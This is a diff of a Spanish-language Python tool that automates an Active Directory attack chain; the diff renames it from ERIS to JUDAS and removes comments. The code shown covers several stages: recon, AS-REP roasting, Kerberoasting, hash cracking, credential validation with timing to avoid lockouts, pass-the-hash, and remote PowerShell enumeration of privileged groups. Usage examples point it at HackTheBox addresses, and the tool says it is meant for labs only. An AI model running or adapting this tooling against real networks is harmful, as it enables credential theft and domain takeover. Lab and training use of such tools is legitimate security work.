@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-ERIS — AD Attack Chain Automation
+JUDAS — AD Attack Chain Automation
 Basado en OCD Active Directory Attack Mindmap 2025
 Solo para entornos controlados: HTB, THM, VulnHub, labs propios.
 """
@@ -32,12 +32,12 @@ MAGENTA= "\033[95m"
 GRAY   = "\033[90m"
 
 BANNER = f"""{BOLD}{RED}
-  ███████╗██████╗ ██╗███████╗
-  ██╔════╝██╔══██╗██║██╔════╝
-  █████╗  ██████╔╝██║███████╗
-  ██╔══╝  ██╔══██╗██║╚════██║
-  ███████╗██║  ██║██║███████║
-  ╚══════╝╚═╝  ╚═╝╚═╝╚══════╝{R}
+     ██╗██╗   ██╗██████╗  █████╗ ███████╗
+     ██║██║   ██║██╔══██╗██╔══██╗██╔════╝
+     ██║██║   ██║██║  ██║███████║███████╗
+██   ██║██║   ██║██║  ██║██╔══██║╚════██║
+╚█████╔╝╚██████╔╝██████╔╝██║  ██║███████║
+ ╚════╝  ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝{R}
 {BOLD}{GRAY}  AD Attack Chain  ·  OCD Mindmap 2025
   Solo entornos controlados: HTB · THM · VulnHub{R}
 """
@@ -66,11 +66,11 @@ def log_cmd(cmd: str) -> None:
 
 # ─── ESTADO COMPARTIDO ──────────────────────────────────────────────────────
 @dataclass
-class ErisContext:
+class JudasContext:
     target_ip:    str  = ""
     domain:       str  = ""
     dc_ip:        str  = ""
-    output_dir:   str  = "eris_output"
+    output_dir:   str  = "judas_output"
 
     # Red
     open_ports:   list = field(default_factory=list)
@@ -124,11 +124,11 @@ class ErisContext:
 
     def save(self) -> None:
         Path(self.output_dir).mkdir(parents=True, exist_ok=True)
-        with open(f"{self.output_dir}/eris_state.json", "w") as f:
+        with open(f"{self.output_dir}/judas_state.json", "w") as f:
             json.dump(asdict(self), f, indent=2, ensure_ascii=False)
 
     @classmethod
-    def load(cls, path: str) -> "ErisContext":
+    def load(cls, path: str) -> "JudasContext":
         with open(path) as f:
             data = json.load(f)
         ctx = cls()
@@ -140,7 +140,7 @@ class ErisContext:
 
 # ─── EJECUTOR DE COMANDOS ────────────────────────────────────────────────────
 class Runner:
-    def __init__(self, ctx: ErisContext):
+    def __init__(self, ctx: JudasContext):
         self.ctx = ctx
         Path(ctx.output_dir).mkdir(parents=True, exist_ok=True)
 
@@ -240,7 +240,6 @@ def parse_cracked_hashcat(pot_file: str, hash_file: str) -> dict:
         password = line[idx+1:]
         for full_hash in hashes_raw:
             if h_fragment in full_hash:
-                # parse_asrep_user devuelve "" si no es AS-REP → or llama a parse_kerb_user
                 user = parse_asrep_user(full_hash) or parse_kerb_user(full_hash)
                 cracked[user] = password
     return cracked
@@ -371,8 +370,8 @@ GROUP_ATTACKS = {
 
 
 # ─── CADENA DE ATAQUE ────────────────────────────────────────────────────────
-class ErisChain:
-    def __init__(self, ctx: ErisContext, runner: Runner):
+class JudasChain:
+    def __init__(self, ctx: JudasContext, runner: Runner):
         self.ctx = ctx
         self.r   = runner
 
@@ -389,7 +388,6 @@ class ErisChain:
         )
         self.r.save("nmap_raw.txt", out)
 
-        # FIX #4: parsear línea a línea para evitar falsos positivos con "open" global
         ctx.open_ports = parse_open_ports(out)
         log_ok(f"Puertos abiertos: {ctx.open_ports}")
 
@@ -432,7 +430,7 @@ class ErisChain:
         if not users_found and creds:
             u = creds[0]
             p = creds[1]
-            if p is not None:  # solo password, no PTH aquí
+            if p is not None:
                 log_step(f"Enumeración autenticada como {u}...")
                 qu, qp = shlex.quote(u), shlex.quote(p)
                 out3, _, _ = self.r.run(
@@ -462,7 +460,6 @@ class ErisChain:
 
         log_phase("FASE 3 — AS-REP ROASTING")
 
-        # FIX #3: garantizar que users.txt existe en disco aunque venga de --users
         ufile    = f"{ctx.output_dir}/users.txt"
         hashfile = f"{ctx.output_dir}/asrep_hashes.txt"
         if not Path(ufile).exists():
@@ -609,7 +606,6 @@ class ErisChain:
 
         log_phase("FASE 6 — VALIDACIÓN DE CREDENCIALES")
 
-        # Validar contraseñas crackeadas
         for user, password in ctx.cracked.items():
             log_step(f"Validando {user}:{password}")
             qu = shlex.quote(user)
@@ -634,10 +630,8 @@ class ErisChain:
                     ctx.valid_winrm.append((user, password))
                     log_ok(f"WinRM ✓  {user}:{password}")
 
-            # FIX #10: jitter entre intentos para reducir riesgo de lockout
             time.sleep(0.5)
 
-        # FIX #6: validar hashes NTLM vía Pass-the-Hash
         if ctx.hashes_ntlm:
             log_step("Validando hashes NTLM (Pass-the-Hash)...")
             for user, nthash in ctx.hashes_ntlm.items():
@@ -693,7 +687,6 @@ class ErisChain:
         def remote(cmd: str) -> str:
             return self.r.exec_remote(cmd, user, password, nthash)
 
-        # FIX de eficiencia: agrupar los net group en un solo script PS1
         group_names = [
             "Domain Admins", "Enterprise Admins", "Schema Admins",
             "Backup Operators", "Server Operators", "DnsAdmins",
@@ -709,7 +702,6 @@ class ErisChain:
         combined = remote(f"powershell -Command \"{ps_script}\"")
         self.r.save("post_enum_combined.txt", combined)
 
-        # Parsear whoami de la salida combinada
         wa_start = combined.find("---WHOAMI---")
         nu_start = combined.find("---NETUSER---")
         wa_section = combined[wa_start:nu_start] if wa_start != -1 and nu_start != -1 else combined
@@ -725,7 +717,6 @@ class ErisChain:
         if ctx.current_groups:
             log_info(f"Grupos ({len(ctx.current_groups)}): {ctx.current_groups[:6]}")
 
-        # Parsear grupos de la salida combinada
         for group in group_names:
             marker = f"---{group}---"
             idx = combined.find(marker)
@@ -739,7 +730,6 @@ class ErisChain:
                 log_ok(f"  {group}: {members}")
             self.r.save(f"group_{group.replace(' ', '_').lower()}.txt", section)
 
-        # Shares SMB (netexec separado, no requiere shell)
         log_step("Enumerando shares SMB...")
         qu = shlex.quote(user)
         qd = shlex.quote(ctx.domain)
@@ -827,7 +817,7 @@ class ErisChain:
     def _print_final_summary(self, paths: list) -> None:
         ctx = self.ctx
         print(f"\n{BOLD}{RED}{'═'*62}{R}")
-        print(f"{BOLD}  RESUMEN ERIS{R}")
+        print(f"{BOLD}  RESUMEN JUDAS{R}")
         print(f"{BOLD}{RED}{'═'*62}{R}\n")
         print(f"  {BOLD}Objetivo:{R}      {ctx.target_ip}  |  {ctx.domain}  |  DC: {ctx.dc_ip}")
         print(f"  {BOLD}Puertos:{R}       {ctx.open_ports}")
@@ -841,7 +831,7 @@ class ErisChain:
         print(f"  {BOLD}Privilegios:{R}   {ctx.privileges}")
         print(f"  {BOLD}Grupos clave:{R}  {list(ctx.net_groups.keys())}")
         print(f"\n  {BOLD}Output:{R} {ctx.output_dir}/")
-        print(f"  {BOLD}Estado:{R} {ctx.output_dir}/eris_state.json")
+        print(f"  {BOLD}Estado:{R} {ctx.output_dir}/judas_state.json")
 
         for u, p in ctx.valid_winrm:
             if p.startswith("HASH:"):
@@ -877,7 +867,6 @@ class ErisChain:
             else:
                 log_info(f"Saltando '{name}' (ya completado)")
 
-        # FIX #8: phase_analyze también respeta phase_done en --resume
         if "analyze" not in self.ctx.phase_done:
             self.phase_analyze()
         else:
@@ -897,7 +886,7 @@ PHASE_COLORS = {
     Phase.ESCALATE: RED, Phase.PERSIST: MAGENTA,
 }
 
-def run_plan_mode(ctx: ErisContext) -> None:
+def run_plan_mode(ctx: JudasContext) -> None:
     log_phase("MODO PLAN — OCD Mindmap 2025")
     creds = ctx.best_creds()
     u = creds[0] if creds else "<user>"
@@ -960,36 +949,36 @@ def run_plan_mode(ctx: ErisContext) -> None:
 # ─── MAIN ────────────────────────────────────────────────────────────────────
 def main() -> None:
     parser = argparse.ArgumentParser(
-        description="ERIS — AD Attack Chain | Solo entornos controlados: HTB · THM · VulnHub",
+        description="JUDAS — AD Attack Chain | Solo entornos controlados: HTB · THM · VulnHub",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Modo automático (ejecuta toda la cadena):
-  python3 eris.py -t 10.10.10.175 -d egotistical-bank.local --auto
+  python3 judas.py -t 10.10.10.175 -d egotistical-bank.local --auto
 
 Con lista de usuarios conocida:
-  python3 eris.py -t 10.10.10.175 -d corp.local --users users.txt --auto
+  python3 judas.py -t 10.10.10.175 -d corp.local --users users.txt --auto
 
 Con credenciales conocidas (salta al post-enum):
-  python3 eris.py -t 10.10.10.175 -d corp.local --creds 'john:Password123' --auto
+  python3 judas.py -t 10.10.10.175 -d corp.local --creds 'john:Password123' --auto
 
 Con hash NTLM (Pass-the-Hash):
-  python3 eris.py -t 10.10.10.175 -d corp.local --hash 'john:aad3b435...' --auto
+  python3 judas.py -t 10.10.10.175 -d corp.local --hash 'john:aad3b435...' --auto
 
 Reanudar sesión anterior (continúa fases pendientes):
-  python3 eris.py --resume eris_output/eris_state.json
+  python3 judas.py --resume judas_output/judas_state.json
 
 Solo sugerencias (sin ejecutar nada):
-  python3 eris.py -t 10.10.10.175 -d corp.local --plan
+  python3 judas.py -t 10.10.10.175 -d corp.local --plan
         """
     )
     parser.add_argument("-t", "--target",     help="IP del objetivo / DC")
     parser.add_argument("-d", "--domain",     help="Dominio AD (ej: corp.local)")
     parser.add_argument(      "--dc",         help="IP del DC si difiere del target")
     parser.add_argument("-u", "--users",      help="Archivo con usuarios (uno por línea)")
-    parser.add_argument("-o", "--output",     default="eris_output", help="Directorio de salida")
+    parser.add_argument("-o", "--output",     default="judas_output", help="Directorio de salida")
     parser.add_argument(      "--auto",       action="store_true", help="Ejecutar cadena completa")
     parser.add_argument(      "--plan",       action="store_true", help="Solo mostrar ruta (sin ejecutar)")
-    parser.add_argument(      "--resume",     help="Reanudar fases pendientes desde eris_state.json")
+    parser.add_argument(      "--resume",     help="Reanudar fases pendientes desde judas_state.json")
     parser.add_argument(      "--reanalyze",  action="store_true", help="Forzar re-análisis de rutas aunque ya esté completado")
     parser.add_argument(      "--creds",      help="Credenciales conocidas: user:pass")
     parser.add_argument(      "--hash",       help="Hash NTLM conocido: user:NThash (Pass-the-Hash)")
@@ -998,7 +987,7 @@ Solo sugerencias (sin ejecutar nada):
     print(BANNER)
 
     if args.resume:
-        ctx = ErisContext.load(args.resume)
+        ctx = JudasContext.load(args.resume)
         log_ok(f"Estado cargado: {args.resume}")
         pending = [s for s in ["recon","enum_users","asrep","kerberoast","crack",
                                 "validate","post_enum","analyze"]
@@ -1009,7 +998,7 @@ Solo sugerencias (sin ejecutar nada):
         if not args.target or not args.domain:
             parser.print_help()
             sys.exit(1)
-        ctx = ErisContext(
+        ctx = JudasContext(
             target_ip  = args.target,
             domain     = args.domain.upper(),
             dc_ip      = args.dc or args.target,
@@ -1031,19 +1020,17 @@ Solo sugerencias (sin ejecutar nada):
         ctx.hashes_ntlm[u] = h
         log_ok(f"Hash NTLM cargado: {u}:{h[:8]}... (se validará vía PTH)")
 
-    # FIX #7: --reanalyze permite forzar re-análisis en resume
     if args.reanalyze and "analyze" in ctx.phase_done:
         ctx.phase_done.remove("analyze")
 
     runner = Runner(ctx)
-    chain  = ErisChain(ctx, runner)
+    chain  = JudasChain(ctx, runner)
 
     if args.plan:
         run_plan_mode(ctx)
     elif args.auto:
         chain.run_full_chain()
     elif args.resume:
-        # FIX #7: --resume sin --auto muestra pendientes y ejecuta solo las que faltan
         chain.run_full_chain()
     else:
         print(f"{YELLOW}Elige un modo:{R}")
